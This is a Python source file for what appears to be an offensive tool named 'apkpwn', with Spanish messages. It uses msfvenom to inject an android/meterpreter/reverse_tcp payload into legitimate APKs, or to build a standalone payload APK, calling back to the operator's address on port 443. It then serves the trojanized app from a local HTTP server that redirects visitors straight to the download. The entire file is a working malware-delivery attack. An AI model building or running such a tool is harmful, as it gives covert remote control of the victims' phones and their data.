import sys
import subprocess
import os
import http.server
import socketserver
import threading
from menu_functions import print_fancy_ascii_art_apkpwn


class Log:
  def status(self, msg):
    print("\033[0;96m[~]\033[0m %s" % msg)
  def success(self, msg):
    print("\033[0;92m[+]\033[0m %s" % msg)
  def error(self, msg):
    print("\033[0;91m[!]\033[0m %s" % msg)
  def debug(self, msg):
    print("\033[0;37m[.]\033[0m %s" % msg)
  def notice(self, msg):
    print("\033[0;93m[?]\033[0m %s" % msg)
  def info(self, msg):
    print("\033[0;94m[*]\033[0m %s" % msg)
  def enum(self, index, msg):
    print("\033[0;94m<\033[0m%s\033[0;94m>\033[0m %s" % (index, msg))
  def warning(self, msg):
    print("\033[0;93m[!]\033[0m %s" % msg)



log = Log()

class android_payload_manager():
    def __init__(self, lhost, lport ):
        self.apk_payload_name = ""
        self.apk_payload_path = ""
        self.lhost = lhost
        self.lport = lport


    def check_dependences(self):
        log.info("Verificando dependencias")
        packages = ["apktool","keytool", 'jarsigner',"msfvenom"]
        for packet in packages:
            try:
                if packet == "msfvenom":
                    subprocess.run(['which', packet], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    log.info("[%s] esta instalado" % (packet))
                    continue

                ver = subprocess.check_output([packet, '--version'], stderr=subprocess.STDOUT).decode().strip()
                log.info("[%s]: %s esta instalado" % (packet,ver))

            except subprocess.CalledProcessError:
                log.error("[%s] no está instalado" % packet)
                sys.exit(1)
        log.success("Dependencias completas")


    # buscar en la carpeta apps y listar y hacer menu para seleccionar app -
    # recibir apk original -
    # inyectar payloadn en app con msfvenom y guardarlo en la carpeta apk_payload -
    # iniciar servidor -

    def list_apk(self):
        try:
            script_dir = os.path.dirname(os.path.realpath(__file__))
            clean_apks_path = os.path.join(script_dir, 'apk/clean_apks/')

            files = os.listdir(clean_apks_path)
            if not files:
                log.warning("No existen apks para inyectar, desea crear un payload simple? (y/n)")
                if not input("> ") == "y":
                    log.info("Saliendo...")
                    sys.exit(1)
                self.generate_android_payload(self.lhost, self.lport)
                return

            log.status("Listando aplicaciones en /apk/clean_apks/")
            print("\n") # salto de linea

            for index, file in enumerate(files, start=1):
                log.enum(index,file)
            log.notice("Seleccione .APK para injectar")

            while True:
                try:
                    opcion = int(input(" >"))
                    if 1 <= opcion <= len(files):  # verificando si está dentro del rango
                        apk_file= files[opcion - 1]
                        log.info(f"APK seleccionado: {apk_file}")
                        self.apk_clear_path = os.path.join(clean_apks_path, apk_file)
                        break
                    else:
                        log.error("Seleccione un número dentro del rango mostrado.")
                except ValueError:
                    log.error("Por favor, ingrese un número válido.")


            apk_payload_path = os.path.join(script_dir, 'apk/apk_payload/')

            log.status("Inyectando payload en %s" % apk_file)
            self.inject_android_payload(self.lhost, self.lport, apk_payload_path, self.apk_clear_path, apk_file)

        except Exception as err:
            log.error(err)


    def inject_android_payload(self, lhost, lport, path, path_clean, name):
        #msfvenom -x /ruta/a/app_original.apk -p android/meterpreter/reverse_tcp LHOST=TU_IP LPORT=TU_PUERTO -o app_modificada.apk

        try:
            log.info("Inyectando payload")
            apk_payload_name= f'{path}{name.replace(".apk","-bad")}.apk'
            command = ['msfvenom', '-x', f'{path_clean}' ,'-p', 'android/meterpreter/reverse_tcp', f'LHOST={lhost}', f'LPORT={lport}', '-o', apk_payload_name]
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, err = process.communicate()
            if not process.returncode == 0:
                log.error("Error en inyección de payload: %s" %err.decode('utf-8') )
                sys.exit(1)
            log.info("Payload inyectado y generado en %s" % apk_payload_name)

        except Exception as e:
            log.error(e)



    def generate_android_payload(self, lhost, lport):
        script_dir = os.path.dirname(os.path.realpath(__file__))
        path = os.path.join(script_dir, 'apk/apk_payload/')
        log.notice("Nombre de aplicación: ")
        name = input("> ")
        # Comando a ejecutar
        try:
            log.info("Creando payload")
            command = ['msfvenom', '-p', 'android/meterpreter/reverse_tcp', f'LHOST={lhost}', f'LPORT={lport}', '-o', f'{path}/{name}.apk']
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, err = process.communicate()

            if not process.returncode == 0:
                log.error("Error en creación de payload: %s" %err.decode('utf-8') )
                sys.exit(1)

            log.info("Payload creado en %s" %  name + ".apk")
            self.apk_payload_name = name
            self.apk_payload_path =  path + name + ".apk"

        except Exception as e:
            log.error(e)

    def get_app_name(self):
        return self.apk_payload_name



class APKHandler(http.server.SimpleHTTPRequestHandler):
    def __init__ (self, *args, app_name=None, **kwargs):
        self.app_name = app_name
        super().__init__(*args, **kwargs)

    def do_GET(self):
        if self.path == "/":
            #redirección ruta al archivo APK
            self.send_response(302) # Lanza 302 ( redirecting )
            self.send_header("Location", "/%s.apk" % self.app_name) #Locacion hacia .apk
            self.end_headers()
        else:
            super().do_GET()



def start_server(app_name=None, directory="./apk/apk_payload/", port=80):
    root_dir = os.getcwd()
    os.chdir(directory)

    # Configurar el manejador para servir los archivos de la carpeta
    request_handler = lambda *args, **kwargs: APKHandler(*args, app_name=app_name, **kwargs)

    with socketserver.TCPServer(("", port), request_handler) as httpd:

        local_address = get_local_address()

        log.success("Servidor corriendo en  segundo plano: http://%s:%s" % (local_address, port))
        log.info("Acceso de contenido desde: %s " % directory)
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            log.info("Servidor detenido, Saliendo.. ")
            os.chdir(root_dir)
            httpd.server_close()


def start_server_in_background(app_name=None, directory="./apk/apk_payload/", port=80):
    root_dir = os.getcwd()
    try:
        server_thread = threading.Thread(target=start_server, args=(app_name, directory, port))
        server_thread.daemon = True
        server_thread.start()

        log.info("El servidor está corriendo en segundo plano.")
        while server_thread.is_alive():
            pass

    except KeyboardInterrupt:
        print("\nServidor detenido.")
        os.chdir(root_dir)
        server_thread.join()


def get_local_address():
    process = subprocess.run(['hostname', '-I'], stdout=subprocess.PIPE)
    return process.stdout.decode('utf-8').strip().split()[0]

# agregar firma de aplicación
print_fancy_ascii_art_apkpwn()
address= get_local_address()
android_manager = android_payload_manager(address, 443)
android_manager.check_dependences()
android_manager.list_apk()
APP_NAME=android_manager.get_app_name()
print(APP_NAME)
start_server_in_background(APP_NAME)










